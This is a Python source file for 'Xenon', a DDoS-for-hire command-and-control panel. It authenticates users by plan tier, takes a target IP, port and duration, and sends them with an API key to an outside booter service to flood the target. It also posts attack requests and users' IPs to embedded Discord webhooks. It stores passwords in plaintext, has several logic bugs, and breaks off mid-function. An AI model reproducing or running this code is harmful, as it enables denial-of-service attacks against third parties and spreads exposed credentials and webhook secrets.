import socket,sys,os,requests,time,threading,random,subprocess,datetime,pathlib,json,ipaddress
from Gradient.gradient import *
from discord_webhook import DiscordWebhook, DiscordEmbed
"""
MADE BY
____    ____   _______.____    ____ .__   __.   ______    _  _    __   ____    ____    ______  
\   \  /   /  /       |\   \  /   / |  \ |  |  /      | _| || |_ /_ | |___ \  |___ \  |____  | 
 \   \/   /  |   (----` \   \/   /  |   \|  | |  ,----'|_  __  _| | |   __) |   __) |     / /  
  \      /    \   \      \_    _/   |  . `  | |  |      _| || |_  | |  |__ <   |__ <     / /   
   \    / .----)   |       |  |     |  |\   | |  `----.|_  __  _| | |  ___) |  ___) |   / /    
    \__/  |_______/        |__|     |__| \__|  \______|  |_||_|   |_| |____/  |____/   /_/     
"""
#------------------- Colors we use for ANSI --------------------
Default          = "\x1b[39m"
Black            = "\x1b[30m"
Red              = "\x1b[31m"
Green            = "\x1b[32m"
Yellow           = "\x1b[33m"
Blue             = "\x1b[34m"
Purple           = "\x1b[35m"
Cyan             = "\x1b[36m"
Light_Grey       = "\x1b[37m"
Dark_Grey        = "\x1b[90m"
Light_red        = "\x1b[91m"
Light_Green      = "\x1b[92m"
Light_Yellow     = "\x1b[93m"
Light_Blue       = "\x1b[94m"
Light_Purple     = "\x1b[95m"
Light_Cyan       = "\x1b[96m"
White            = "\x1b[97m"
Default_BG       = "\x1b[49m"
Black_BG         = "\x1b[40m"
Red_BG           = "\x1b[41m"
Green_BG         = "\x1b[42m"
Yellow_BG        = "\x1b[43m"
Blue_BG          = "\x1b[44m"
Purple_BG        = "\x1b[45m"
Cyan_BG          = "\x1b[46m"
Light_Gray_BG    = "\x1b[47m"
Dark_Gray_BG     = "\x1b[100m"
Light_Red_BG     = "\x1b[101m"
Light_Green_BG   = "\x1b[102m"
Light_Yellow_BG  = "\x1b[103m"
Light_Blue_BG    = "\x1b[104m"
Light_Purple_BG  = "\x1b[105m"
Light_Cyan_BG    = "\x1b[106m"
White_BG         = "\x1b[107m"
Underline        = "\033[4m"
Reset_underline  = "\033[0m"
Clear	         = "\033[2J\033[1;1H"

#------------------------- Our main page banner ( IDK WHY I PUT IT HERE )
ban1                       = ('''           ─┐ ┬┌─┐┌┐┌┌─┐┌┐┌\r
                            ┌┴┬┘├┤ ││││ ││││\r
                            ┴ └─└─┘┘└┘└─┘┘└┘\r''')

OurBanner                  = (ban1) 
#------------------- Discord params ----------------------------
discordConnectHook         = "https://canary.discord.com/api/webhooks/918584931792339014/OyS32T_9vXoLK7pmZ0RD-03_zr9_XvmblcH9cHl1ZkJngVyXdkClTrD3jXwZLGF4B9oS"
discordDisConnecttHook     = "https://canary.discord.com/api/webhooks/918589993436450897/5HWVuSivStw4iBDIXg7mEapQeB5gN0Nn_Dci-cRVJOJajB0deC9N5WzKZkzTkalbAeh0"
disccordAttackLogHook      = "https://discord.com/api/webhooks/921418986409820211/Gisq6JJCeLXLvn6RDqJK-yTJ5_Vjp52RrrNa2mwNVK0EJBBYeNpFheqxwgMQKg-GEsbd"
discordSuggestionLogHook   = "https://discord.com/api/webhooks/921419100452970546/7F814LTnjiCmVybMYvt_M6RGDUHJZtvNDZocerjdFGmprda_cSihotMg0m-Ou5B7ht6Y"
#------------------- Things we need ----------------------------
timenow = datetime.datetime.now()
#--------------------- Api Stuff. ------------------------------
UsersPlan = ['http://1.1.1.1/API1', 'http://2.2.2.2/API']
#------------------- Variables we need -------------------------
blacklistedChars = ['"','print',"'", 'NULL']
blacklistedIP    = []
commands         = ['HELP', 'INFO', 'SEND', 'QUIT', 'EXIT', 'LOGOUT', 'SUGGEST', 'METHODS', 'ONGOING', 'IPLOOKUP', 'CLEAR', 'USERREMOVE','USERADD', 'HISTORY', 'UNBAN', 'TESTFADE', 'CLS', 'ONLINE']
hashing          = ['#','~','!','"','^',')','£','@','a','b','c','d','e','1','f','g','h','i','2','j','k','l','m','n','o','p','q','3','4','r','s','t','u','v','w','x','y','z', '36']
methods          = ['OVH-X']
attacksIPS       = []
#------------------- Our variables -----------------------------
hostname    = ("xenon.security.xyz")
host        = ("127.0.0.1")
port        = 3232                                 # Our CNC port.
buffer_len  = 1024
motdG       = ("REPORT ALL BUGS!")
proxy       = True
totalAttks  = 0
ApiMount    = ("99")
usersOnline = 0
hisAttacks  = ""
idAttacks   = 0
ongoing     = ("ID  IP               PORT   TIME   USER \r\n━━━ ━━━━━━━━━━━━━━━  ━━━━━  ━━━━━  ━━━━━━━\r\n")
UsersT      = ("USERNAME        IP \r\n━━━━━━━━━━━━━━    ━━━━━━━━━━━━━━━\r\n")
ongoingID   = 1
sleep1      = time.sleep(1)
WeCanLogin2 = "FALSE"
#--------------------------- Gradiant R G B --------------------
rgb1        = [132, 84, 211]
rgb2        = [55, 191, 220]
#------------------- Open socket ------------------------------- { Thanks to Ocp#0646 for this as i do not know sockets much. }
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((host, port))
sock.listen()
#----------------------- Send message -------------------------
print (f" [X] Xenon security -> C2 is now listening on {host}:{port}. [{timenow}]")
#---------------------- Write config logs ---------------------
fm = open("[X] Config\\pastconfigs.xenon", "a+")
fm.write(f'''\n [{timenow}]
    Hostname        : {hostname}
    Host            : {host}
    Port            : {port}
    Buffer Length   : {buffer_len}
    MOTD            : '{motdG}'
    Proxy           : {proxy}
    API PB          : {ApiMount}
''')
fm.close()

#------------------------- Add users --------------------------
def AddUserToTable(username, ip, ide):
    try:
        username = (str(username))
        ip       = (str(ip))
        ide      = (str(ide))
    except ValueError:
        print (f" COuldn't make TABLE for {username} {ip} ID {ide}") 
    # Skid way to make a table - vSYnc#1337
    global UsersT
    # So for here, i couldn't use match cases as they don't suport lengths etc for variables for cases, idk.
    if len(username) > 14:
        username = (f"{username[0:14]}")
    elif len(username) == 14:
        username = (f"{username}    ")
    elif len(username) == 13:
        username = (f"{username}     ")
    elif len(username) == 12:
        username = (f"{username}      ")
    elif len(username) == 11:
        username = (f"{username}       ")
    elif len(username) == 10:
        username = (f"{username}        ")
    elif len(username) == 9:
        username = (f"{username}         ")
    elif len(username) == 8:
        username = (f"{username}          ")
    elif len(username) == 7:
        username = (f"{username}           ")
    elif len(username) == 6:
        username = (f"{username}            ")
    elif len(username) == 5:
        username = (f"{username}             ")
    elif len(username) == 4:
        username = (f"{username}              ")
    elif len(username) == 3:
        username = (f"{username}               ")
    elif len(username) == 2:
        username = (f"{username}                ")
    elif len(username) == 1:
        username = (f"{username}                 ")
    UsersT += (f"{username}{ip}\r\n")

#------------------------- Return history of attacks ----------
def ReadPrevious(PlanToRead):
    global hisAttacks
    if PlanToRead == "Owner":
        if hisAttacks == "":
            return " No attacks YET."
        else:
            return hisAttacks
    else:
        return "Error, you are not allowed to use this command."

#------------------------ Return previous attacks --------------
def AddAttack(username, ip, port, time, method, Plan):
    global timenow
    global hisAttacks
    global idAttacks
    idAttacks  += 1
    hisAttacks += (f"{idAttacks} | {username} sent an attack to {ip}:{port} for {time} seconds using {method} {timenow}\r\n")

#---------------------- Funnel attack ( for owners ) -------------
def sendFunnel(ip, port, time, method):
    X     = requests.get("http://1.1.1.1/#API1")
    E     = requests.get("http://2.2.2.2/#API2")
    N     = requests.get("http://3.3.3.3/#API3")
    O     = requests.get("http://4.4.4.4/#API4")
    N     = requests.get("http://5.5.5.5/#APi5")
    return f" Sent an attack to {ip}:{port} for '{time}' seconds using {method}. "

#------------------ Unban a user from the C2 -----------------------
def unban(username):
    # we don't need to sanatize variables as only OWNERS can use this command.
    toRemove = (f"[X] B Users\\{username}.xenon")
    try:
        os.remove(toRemove)
        return "ST"
    except FileNotFoundError:
        return "User not found"

#------------------- Def Gradianteeee ------------------------------
def GradiantTool(neamk):   # thanks to OCP again for making the tool for me ( integrated in the C2 )
    neGonderekOC    = (GradientFunc.gradiant([132, 84, 211], [55, 191, 220], neamk)) # change the R G B values to the gradiant you want.https://www.colorhexa.com/
    EnSonNeOC       = (f"{neGonderekOC}{Default}{Default_BG}")
    return EnSonNeOC

#------------------- New request every clear sreen MOTD ------------
def GetMOTD():
    motd = requests.get(f"{motdG}").text.strip().replace("\r\n", "")
    return motd

#-------------------- New request every clear screen API -----------
def GetAPIS():
    apis = requests.get(f"{ApiMount}").text.strip().replace("\r\n", "")
    return apis

#------------------- Ban a user -------------------------------------
def ban(user):
    try:
        user = (str(user))
    except ValueError:
        return "Couldn't convert SI -> S"

    CheckIfAlreadYbanned = pathlib.Path(f"[X] B Users\\{user}.xenon")

    if CheckIfAlreadYbanned.exists():
        return "This user is already banned"
    else:
        try:
            BanTheUser = open(f"[X] B Users\\{user}.xenon", "x")
            BanTheUser.close()
            return "Successfully banned the user"
        except FileExistsError:
            return "This user is already banned"

#--------------------- Check if banned ----------------------------
def CheckBan(username):
    try:
        username = (str(username))
    except ValueError:
        return "ERROR"
    
    CheckIfBanned = pathlib.Path(f"[X] B Users\\{username}.xenon")

    if CheckIfBanned.exists():
        return "TRUE"
    else:
        return "FALSE"

#--------------------- Add Ongoing -------------------------------- ~ look don't bully me LMAO this is the only way my brain thinks ( im a stupid skid ).
def OngoingAdd(idf, ip, port, time, user):
    global ongoing
    global ongoingID
    try:
        port = (str(port))
        time = (str(time))
        onrt = (str(ongoingID))
    except ValueError:
        print (" Couldn't convert. ")
    if len(onrt) == 1:
        Tableid = (f" {ongoingID}  ")
    elif len(onrt) == 2:
        Tableid = (f"{ongoingID}  ")

    if len(ip) == 15:
        tableip = (f"{ip}  ")
    elif len(ip) == 14:
        tableip = (f"{ip}   ")
    elif len(ip) == 13:
        tableip = (f"{ip}    ")
    elif len(ip) == 12:
        tableip = (f"{ip}     ")
    elif len(ip) == 11:
        tableip = (f"{ip}      ")
    elif len(ip) == 10:
        tableip = (f"{ip}       ")
    elif len(ip) == 9:
        tableip = (f"{ip}        ")
    elif len(ip) == 8:
        tableip = (f"{ip}         ")
    elif len(ip) == 7:
        tableip = (f"{ip}          ")
    elif len(ip) == 6:
        tableip = (f"{ip}           ")
    elif len(ip) == 5:
        tableip = (f"{ip}            ")
    #Idk why i decided to carry on here LMAO 
    elif len(ip) == 4:
        tableip = (f"{ip}             ")
    elif len(ip) == 3:
        tableip = (f"{ip}              ")
    elif len(ip) == 2:
        tableip = (f"{ip}               ")
    elif len(ip) == 1:
        tableip = (f"{ip}                ")
    
    if len(port) == 5: 
        tableport = (f"{port}  ")
    elif len(port) == 4:
        tableport = (f"{port}   ")
    elif len(port) == 3:
        tableport = (f"{port}    ")
    elif len(port) == 2:
        tableport = (f"{port}     ")
    elif len(port) == 1:
        tableport = (f"{port}      ")
    
    if len(time) == 5:
        tableTime = (f"{time}   ")
    elif len(time) == 4:
        tableTime = (f"{time}   ")
    elif len(time) == 3:
        tableTime = (f"{time}    ")
    elif len(time) == 2:
        tableTime = (f"{time}     ")
    elif len(time) == 1:
        tableTime = (f"{time}      ")
    
    ongoing    += (f"{Tableid}{tableip}{tableport}{tableTime}{user}\r\n")
    ongoingID  += 1

#-------------------- ongoing --------------------------------------
def Ongoing():
    global ongoing
    return ongoing


#------------------- Attack hash (IP and PORT) ---------------------
def HashATTK(ip, port, username):
    WeGotOurHas1 = ""
    for x in range(26):
        genRandom1 = random.randint(1,35)
        GetOurHash1 = hashing[genRandom1]
        WeGotOurHas1 = f"{WeGotOurHas1}{GetOurHash1}"
    
    letHash1 = WeGotOurHas1

    hashOpen = open(f"[X] Attack Hash\\Attack_hashes.xenon", "a+")
    hashOpen.write (f''' [{timenow}]
    Username  --> {username}
    Hash      --> {letHash1}\n''')
    hashOpen.close()
    return letHash1

#------------------- IDDB -------------------------------------------
def IDDB(username):
    checkID = pathlib.Path(f"[X] Credentials\\[X] ID\\{username}.xenon")
    if checkID.exists():
        f = open(f"[X] Credentials\\[X] ID\\{username}.xenon", "r")
        CheckID11 = f.readline()
        return CheckID11
        f.close()
    else:
        return "__________"

#--------- Hash our username and passwords. ----------------
def Hash(userame, password):
    WeGotOurHas = ""
    for x in range(26):
        genRandom = random.randint(1,35)
        GetOurHash = hashing[genRandom]
        WeGotOurHas = f"{WeGotOurHas}{GetOurHash}"
    
    letHash = WeGotOurHas
    
    f = open(f"[X] Hashed\\{userame}.myHash.xenon", "a+")
    f.write(f"\n----------------------------------\n Username      Password       Hash\n----------------------------------\n {userame}         {password}          {letHash}\n")
    f.close()

    return letHash

#------------------ Ping IP ----------------------------------
def Ping(ip):   # idk why i made this, we probally wont use it in this C2.
    f = subprocess.getoutput(['ping',ip])
    return f

#------------------- GetPlan -----------------------------------
def CheckPlan(username):
    CheckIfExists22 = pathlib.Path(f"[X] Credentials\\[X] Plan\\{username}.xenon")
    if CheckIfExists22.exists():
        readPlan      = open(f"[X] Credentials\\[X] Plan\\{username}.xenon", "r")
        readPlanFrom  = readPlan.readline()
        PlanDB        = readPlanFrom[0:]
        readPlan.close()
        
        if PlanDB == "Owner":
            return "Owner"

        elif PlanDB == "MVP":
            return "VIP+"

        elif PlanDB == "VIP":
            return "VIP"
        
        elif PlanDB == "User":
            return "User"

        else:
            return "NOPLAN"
    
    else:
        return "NOFIND --> Please contact vSync#1337"

#--------------------- Check Concurrent ------------------------
def CheckConcurrent(username):
    CheckOpenConc = pathlib.Path(f"[X] Credentials\\[X] Concurrent\\{username}.xenon")
    if CheckOpenConc.exists():
        OpenCon     = open(f"[X] Credentials\\[X] Concurrent\\{username}.xenon")
        readCon     = OpenCon.readline()
        Concurrent  = readCon[0:]
        OpenCon.close()
        return Concurrent
    else:
        return "NOFIND --> Please contact vSync#1337"

#------------------- Start our CNC -----------------------------
def CheckDB(username,password):
    CheckIfExists = pathlib.Path(f"[X] Credentials\\[X] Users\\{username}.xenon")
    if CheckIfExists.exists():
        ReadDB        = open(f"[X] Credentials\\[X] Users\\{username}.xenon", "r")
        ReadDBFrom    = ReadDB.read()
        usernameDB    = ReadDBFrom[0:]
        ReadDB.close()

        if usernameDB == username:
            CheckPassword  = pathlib.Path(f"[X] Credentials\\[X] Passwords\\{username}.xenon")
            if CheckPassword.exists():
                readPS        = open(f"[X] Credentials\\[X] Passwords\\{username}.xenon")
                readPSFrom    = readPS.read()
                passwordDB    = readPSFrom[0:]
                readPS.close()

                if usernameDB == username and passwordDB == password:
                    return "True"
                
                elif usernameDB == username and password not in password:
                    return "False"
                
                elif usernameDB not in username and password == password:
                    return " We got a Error"
                
                else:
                    return "False"
                    
            else:
                return "False"

        elif usernameDB not in username:
            return "False"
            
        else:
            return "We got a Error"
    else:
        return "USERROR"

#--------------------- Sent attack ----------------------------
def SentAttack(username:str, ip, port:int, time:int, method, Plan):
    global rgb1
    global rgb2
    global totalAttks
    global sleep1
    concurrent = CheckConcurrent(username)
    getFrom11 = (int(len(username))) - 1
    PasswordLen11 = "." * getFrom11
    UsernameSecret = (f"{username[:1]}{PasswordLen11}")
    if Plan == "Owner":
        isVIP = True

    elif Plan == "VIP":
        isVIP = True

    elif Plan == "User":
        isVIP = False

    elif Plan == "VIP+":
        isVIP = True

    else:
        return " SentAttackError"

    #------------- User -----------------------
    if Plan == "User" and (int(time)) > 301:
        CanSend = False

    elif Plan == "User" and (int(time)) < 301:
        CanSend = True
    

    elif Plan == "VIP" and (int(time)) > 501:
        CanSend == False
    
    elif Plan == "VIP" and (int(time)) < 501:
        CanSend = True

    
    elif Plan == "VIP+" and (int(time)) > 701:
        CanSend = False
    
    elif Plan == "VIP+" and (int(time)) < 701:
        CanSend = True
    
    elif Plan == "Owner":
        CanSend = True
    
    else:
        CanSend = False

    try:
        ValidateIP = ipaddress.ip_address(ip)
        ipvalid11 = "valid"
    except:
        CanSend = False
        ipvalid11 = "invalid"

    if ipvalid11 == "valid" and CanSend == True and isVIP == True:
        sendAttack = (f'''           ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗\r 
          ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║\r
           ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ \r
        ╔══════════════════════════════════════════════\r
        ║  {Underline}TARGET{Reset_underline}    ⮞  [{Underline}{ip}{Reset_underline}]\r
        ║  {Underline}PORT{Reset_underline}      ⮞  [{Underline}{port}{Reset_underline}]\r
        ║  {Underline}TIME{Reset_underline}      ⮞  [{Underline}{time}{Reset_underline}]\r
        ║  {Underline}METHOD{Reset_underline}    ⮞  [{Underline}{method}{Reset_underline}]\r
        ║  {Underline}PPS{Reset_underline}       ⮞  [{Underline}-1{Reset_underline} (UNLIMITED)]\r
        ╠══════════════════════════════════════════════\r
        ║  {Underline}VIP{Reset_underline}       ⮞  [{Underline}True{Reset_underline}]\r
        ║  {Underline}SPOOFED{Reset_underline}   ⮞  [{Underline}True{Reset_underline}]\r
        ║  {Underline}HASH{Reset_underline}      ⮞  [{Underline}{HashATTK(ip,port,username)}{Reset_underline}]\r
        ║  {Underline}PLAN{Reset_underline}      ⮞  [{Underline}{Plan}{Reset_underline}]\r
        ╠══════════════════════════════════════════════\r
        ║  {Underline}TIMESTAMP{Reset_underline} ⮞  [{Underline}{timenow}{Reset_underline}]\r
        ║  {Underline}USER{Reset_underline}      ⮞  [{Underline}{UsernameSecret}{Reset_underline}]\r
        ║  {Underline}ID{Reset_underline}        ⮞  [{Underline}{IDDB(username)}{Reset_underline}]\r
        ╚══════════════════════════════════════════════\r''')
        OngoingAdd(IDDB(username), ip, port, time, username)
        totalAttks = totalAttks + 1
        AddAttack(username, ip, port, time, method, Plan)
        if method == "OVH-X":
            u = requests.get(f"https://eclipse-api.xyz/client/api.php?key=1fe7osfvpl2xq2g&host={ip}&port={port}&time={time}&method=TCP-BETA")
            print(f"[HTTP] requests response: {u}")
        else:
            print(f"[HTTP] Couldn't send attack. {u}")
        return sendAttack

    elif ipvalid11 == "valid" and CanSend == True and isVIP == False:
        sendAttack = (f'''           ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗\r 
          ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║\r
           ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ \r
        ╔═════════════════════════════════════\r
        ║  TARGET    ⮞  [{ip}]\r
        ║  PORT      ⮞  [{port}]\r
        ║  TIME      ⮞  [{time}]\r
        ║  METHOD    ⮞  [{method}]\r
        ║  PPS       ⮞  [-1 (UNLIMITED)]\r
        ╠════════════════════════════════════\r
        ║  VIP       ⮞  [False]\r
        ║  SPOOFED   ⮞  [True]\r
        ║  HASH      ⮞  [{HashATTK(ip,port,username)}]\r
        ║  PLAN      ⮞  [{Plan}]\r
        ╠════════════════════════════════════\r
        ║  TIMESTAMP ⮞  [{timenow}]\r
        ║  USER      ⮞  [{UsernameSecret}]\r
        ║  ID        ⮞  [{IDDB(username)}]\r
        ╚════════════════════════════════════\r''')
        totalAttks = totalAttks + 1
        OngoingAdd(IDDB(username), ip, port, time, username)
        AddAttack(username, ip, port, time, method, Plan)
        if method == "OVH-X":
            u = requests.get(f"https://eclipse-api.xyz/client/api.php?key=1fe7osfvpl2xq2g&host={ip}&port={port}&time={time}&method=TCP-BETA")
            print(f"[HTTP] requests response: {u}")
        else:
            print(f"[HTTP] Couldn't send attack. {u}")
    
    elif CanSend == False:
        return f"        Attack aborted, Error code [501]\r"
    
    else:
        return " AEERROR"
#-------------------- Captcha ---------------------------------
def GenCaptcha():
    gen = random.randint(1,99999) 
    return str(gen)

#----------------- Main page ---------------------------------
def MainPage(client, addr, username, password, what):
    # So for here, if you HAVE TIME put 'try:' and at the end of this function put a 'except OSError:' and print something like 'Client has disconnected' because that annoying message keeps coming up whenever they disconnect without the quit command
    global rgb1
    global rgb2
    global usersOnline
    global BlacklistedIP
    global totalAttks
    global OurBanner
    global ban1

    checkingBan = CheckBan(username)
    if checkingBan == "TRUE":
        client.send(f"{Clear} You are banned from Xenon C2".encode()) ## Users Online: {usersOnline}
        client.close()
    client.send(str(f"\033]0; [X] Xenon security | {usersOnline} Clients Online |v0.01| {totalAttks} Total Attacks | @xvsync & @xd_dismiss\007").encode())
    client.send(f"{Clear}".encode())  
    str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")
    getOurSHit = (f"{Default}{Default_BG}🚀⚫ Welcome [{username}] to Xenon Security ⚫ {motdG} ⚫ V0.01")
    
    client.send(
f'''{getOurSHit}\r\n
{what}
\r\n╔═[{username}@Xenon]=#\r\n╚══⮞{Default_BG}'''.encode())

    WhatWeGotFromClient = str(client.recv(buffer_len).decode()).strip().replace("\r\n", "").upper()

    if len(WhatWeGotFromClient) > 15:
            mf = (f"     The length of your input was too high '{len(WhatWeGotFromClient)} Chars.'.\r")
            MainPage(client, addr, username, password, mf)
    
    elif WhatWeGotFromClient not in commands:
        MainPage(client, addr, username, password, "       Command invalid. ")
    match WhatWeGotFromClient:
        case "CLEAR":
            MainPage(client, addr, username, password, f"                 {ban1}\r\n")

        case "CLS":
            MainPage(client, addr, username, password, f"                 {ban1}\r\n")

        case "HELP":
            ThePlan = CheckPlan(username)
            if ThePlan == "User":
                sendThis = (
f'''                               ╦ ╦╔═╗╦  ╔═╗\r
                               ╠═╣║╣ ║  ╠═╝\r
                               ╩ ╩╚═╝╩═╝╩ \r
                ╔══════════════════════════════════════════════╗\r
                ║ {Underline}INFO{Reset_underline}       ⮞ Shows your account information  ║ \r
                ║ {Underline}SEND{Reset_underline}       ⮞ Send an attack to a server      ║ \r
                ║ {Underline}QUIT{Reset_underline}       ⮞ Log-out the C2                  ║ \r
                ║ {Underline}SUGGEST{Reset_underline}    ⮞ Suggest something to the owners ║ \r
                ║ {Underline}METHODS{Reset_underline}    ⮞ Shows the methods               ║ \r
                ║ {Underline}IPLOOKUP{Reset_underline}   ⮞ Geo locate an IP                ║ \r
                ║ {Underline}CLEAR{Reset_underline}      ⮞ Clear the screen                ║ \r
                ╚══════════════════════════════════════════════╝\r''')
                MainPage(client, addr, username, password, sendThis)
            elif ThePlan == "Owner":
                sendThis = (
f'''                               ╦ ╦╔═╗╦  ╔═╗\r
                               ╠═╣║╣ ║  ╠═╝\r
                               ╩ ╩╚═╝╩═╝╩ \r
                ╔══════════════════════════════════════════════╗\r
                ║ {Underline}INFO{Reset_underline}       ⮞ Shows your account information  ║ \r
                ║ {Underline}SEND{Reset_underline}       ⮞ Send an attack to a server      ║ \r
                ║ {Underline}QUIT{Reset_underline}       ⮞ Log-out the C2                  ║ \r
                ║ {Underline}SUGGEST{Reset_underline}    ⮞ Suggest something to the owners ║ \r
                ║ {Underline}METHODS{Reset_underline}    ⮞ Shows the methods               ║ \r
                ║ {Underline}ONGOING{Reset_underline}    ⮞ Show the ongoing attacks (owner)║ \r
                ║ {Underline}IPLOOKUP{Reset_underline}   ⮞ Geo locate an IP                ║ \r
                ║ {Underline}CLEAR{Reset_underline}      ⮞ Clear the screen                ║ \r
                ║ {Underline}USERREMOVE{Reset_underline} ⮞ Remove '1' User count.          ║ \r
                ║ {Underline}USERADD{Reset_underline}    ⮞ Add '1' user count.             ║ \r
                ║ {Underline}HISTORY{Reset_underline}    ⮞ Preview the recent attacks      ║ \r
                ║ {Underline}UNBAN{Reset_underline}      ⮞ Unban a user from the DB        ║ \r
                ╚══════════════════════════════════════════════╝\r''')
                MainPage(client, addr, username, password, sendThis)
        
            elif ThePlan == "VIP":
                sendThis = (
f'''                               ╦ ╦╔═╗╦  ╔═╗\r
                               ╠═╣║╣ ║  ╠═╝\r
                               ╩ ╩╚═╝╩═╝╩ \r
                ╔══════════════════════════════════════════════╗\r
                ║ {Underline}INFO{Reset_underline}       ⮞ Shows your account information  ║ \r
                ║ {Underline}SEND{Reset_underline}       ⮞ Send an attack to a server      ║ \r
                ║ {Underline}QUIT{Reset_underline}       ⮞ Log-out the C2                  ║ \r
                ║ {Underline}SUGGEST{Reset_underline}    ⮞ Suggest something to the owners ║ \r
                ║ {Underline}METHODS{Reset_underline}    ⮞ Shows the methods               ║ \r
                ║ {Underline}IPLOOKUP{Reset_underline}   ⮞ Geo locate an IP                ║ \r
                ║ {Underline}CLEAR{Reset_underline}      ⮞ Clear the screen                ║ \r
                ╚══════════════════════════════════════════════╝\r''')
                MainPage(client, addr, username, password, sendThis)
            
            elif ThePlan == "VIP+":
                sendThis = (
f'''                               ╦ ╦╔═╗╦  ╔═╗\r
                               ╠═╣║╣ ║  ╠═╝\r
                               ╩ ╩╚═╝╩═╝╩ \r
                ╔══════════════════════════════════════════════╗\r
                ║ {Underline}INFO{Reset_underline}       ⮞ Shows your account information  ║ \r
                ║ {Underline}SEND{Reset_underline}       ⮞ Send an attack to a server      ║ \r
                ║ {Underline}QUIT{Reset_underline}       ⮞ Log-out the C2                  ║ \r
                ║ {Underline}SUGGEST{Reset_underline}    ⮞ Suggest something to the owners ║ \r
                ║ {Underline}METHODS{Reset_underline}    ⮞ Shows the methods               ║ \r
                ║ {Underline}IPLOOKUP{Reset_underline}   ⮞ Geo locate an IP                ║ \r
                ║ {Underline}CLEAR{Reset_underline}      ⮞ Clear the screen                ║ \r
                ╚══════════════════════════════════════════════╝\r''')

            else:
                MainPage(client, addr, username, password, "       NOPLAN [305]")
        
        case "INFO":
            getFrom = (int(len(password))) - 1
            PasswordLen = "." * getFrom
            InfoPage = (f'''USERNAME    : {username}\r
PASSWORD    : {password[:1]}{PasswordLen}\r
IP          : {addr[0]}\r
PLAN        : {CheckPlan(username)}\r
HASH        : {Hash(username,password)}\r
ID          : {IDDB(username)}\r
Concurrents : {CheckConcurrent(username)}''')
            MainPage(client, addr, username, password, InfoPage)
        
        case "SEND":
            str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")
            client.send("IP/Domain : ".encode())
            IPFromC = str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")

            str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")
            client.send("Port : ".encode())
            PortFROMC = str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")

            str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")
            client.send("Time : ".encode())
            timeFromC = str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")

            str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")
            client.send("Method : ".encode())
            methodFromC = str(client.recv(buffer_len).decode()).strip().replace("\r\n", "").upper()

            MyPlan = CheckPlan(username)
            print (f" [DEBUG] Got {IPFromC}:{PortFROMC} {timeFromC} {methodFromC} -> {MyPlan}")

            try:
                TimeInt = (int(timeFromC))
                portInt = (int(PortFROMC))
            except ValueError:
                MainPage(client, addr, username, password, f"       Couldn't convert P and T to INT --> Your input was a str. ")
            
            if len(IPFromC) > 20:
                MainPage(client, addr, username, password, f"       The URL you've entered is too long. '{len(IPFromC)}' characters. ")
            if portInt > 65535:
                MainPage(client, addr, username, password, f"       The port {portInt} is greater than 65535.")
            if IPFromC in blacklistedChars:
             MainPage(client, addr, username, password, f"        BlacklistedIP")
            if methodFromC not in methods:
                MainPage(client, addr, username, password, f"         {methodFromC} is not a valid method.")

            elif methodFromC in methods:
                MakeOurAttackLog = open("[X] Logs\\[X] Attack_log.xenon", "a+")
                MakeOurAttackLog.write(f'''\n   [{timenow}]
        Username       : {username}
        SentAttackIP   : {IPFromC}
        PortAttackIP   : {PortFROMC}
        TimeAttackIP   : {timeFromC}
        MethodAttackIP : {methodFromC}
        Plan           : {MyPlan}
        -->   This attack is not 100% sent, it still has to go through sanitation.
    ''')
                MakeOurAttackLog.close()
                webhook = DiscordWebhook(url=disccordAttackLogHook)
                embed = DiscordEmbed(title='Xenon C2', description='Message from Xenon', color='03b2f8')
                embed.set_author(name='View Users IP on Checkhost.', url=f'https://check-host.net/ip-info?host={addr[0]}', icon_url='https://physicsworld.com/wp-content/uploads/2013/07/PW-2013-07-05-Commissariat-xenon-main.jpg')
                embed.set_footer(text='A new Attack.')
                embed.set_timestamp()
                embed.add_embed_field(name='USERS-IP Address', value=f'{addr[0]}')
                embed.add_embed_field(name='USERS-C_Port', value=f'{addr[1]}')
                embed.add_embed_field(name='Requested IP to flood', value=f'{IPFromC}')
                embed.add_embed_field(name='Requested Port to flood', value=f'{PortFROMC}')
                embed.add_embed_field(name='Requested Flood time', value=f'{timeFromC}')
                embed.add_embed_field(name='Requested Method', value=f'{methodFromC}')
                embed.add_embed_field(name='Their Username', value=f'{username}')
                webhook.add_embed(embed)
                response = webhook.execute()
                MainPage(client, addr, username, password, SentAttack(username, IPFromC, portInt, TimeInt, methodFromC, MyPlan))
            else:
                MainPage(client, addr, username, password, f"      Error[405]")

        case "ONLINE":
            if usersOnline > 1:
                Whattttt = "users"
                WhatIS   = "are"
            else:
                Whattttt = "user"
                WhatIS   = "is"
            MainPage(client, addr, username, password, f"                 Their {WhatIS} {usersOnline} {Whattttt} online.\r")
        
        case "SUGGEST":
            str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")
            client.send(" Suggest ( BETA ) : ".encode())
            Suggestion = str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")
            print (f" [X] New suggestion from {addr[0]} --> {Suggestion}")
            if Suggestion in blacklistedChars:
                MainPage(client, addr, username, password, f"     Testing")
            elif len(Suggestion) > 20:
                MainPage(client, addr, username, password, f"         You cannot enter more than 20 chars in the suggestion page. ")
            else:

                WriteLog = open("[X] Logs\\[X] Suggestion_log.xenon", "a+")
                WriteLog.write(f'''\n   [{timenow}]
        Username    : {username}
        Suggestion  : '{Suggestion}
        IP          : {addr[0]}
        C_port      : {addr[1]}
''')
                WriteLog.close()
                MyPlan = CheckPlan(username)
                #----------- Send Discord webhook message--------------------------------------
